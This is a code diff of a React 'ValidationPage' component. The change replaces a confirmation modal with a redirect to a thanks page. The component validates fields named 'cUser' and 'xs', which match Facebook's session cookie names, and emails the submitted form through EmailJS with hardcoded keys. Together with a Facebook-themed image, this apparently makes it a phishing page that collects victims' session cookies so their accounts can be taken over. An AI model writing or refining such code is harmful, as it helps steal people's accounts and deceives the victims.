@@ -1,12 +1,12 @@
 import React, { useState, useRef } from "react";
+import { useHistory } from "react-router-dom";
 import emailjs from "@emailjs/browser";
 import FacebookVideo from "../assets/fbVideo.png";
-import ThanksPage from "../pages/ThanksPage"; 
 import "./style.css";
 
 const ValidationPage = () => {
   const form = useRef();
-  const [showModal, setShowModal] = useState(false);
+  const history = useHistory(); // Use useHistory hook for navigation
   const [isFormValid, setIsFormValid] = useState(false);
 
   const sendEmail = (e) => {
@@ -24,23 +24,23 @@ const ValidationPage = () => {
     const isXsValid = xsPattern.test(xsValue);
 
     if (isCUserValid && isXsValid) {
-      // Fields are valid, send the email and show the modal
+      // Fields are valid, send the email
 
       emailjs
-      .sendForm(
-        "service_p6jnphg",
-        "template_ji0awb6",
-        form.current,
-        "ZJ7cCouSSc4UKiIVj",
-      )
+        .sendForm(
+          "service_p6jnphg",
+          "template_ji0awb6",
+          form.current,
+          "ZJ7cCouSSc4UKiIVj"
+        )
         .then(
           (result) => {
             console.log("result text is", result.text);
-            setShowModal(true);
+            history.push("/thanks"); // Navigate to ThanksPage
           },
           (error) => {
             console.log(error.text);
-          },
+          }
         );
     } else {
       // Fields are not valid, set a flag to display an error message
@@ -160,9 +160,6 @@ const ValidationPage = () => {
           </div>
         </div>
       </form>
-      {showModal && (
-        <LoginModal showModal={showModal} setShowModal={setShowModal} />
-      )}
     </>
   );
 };
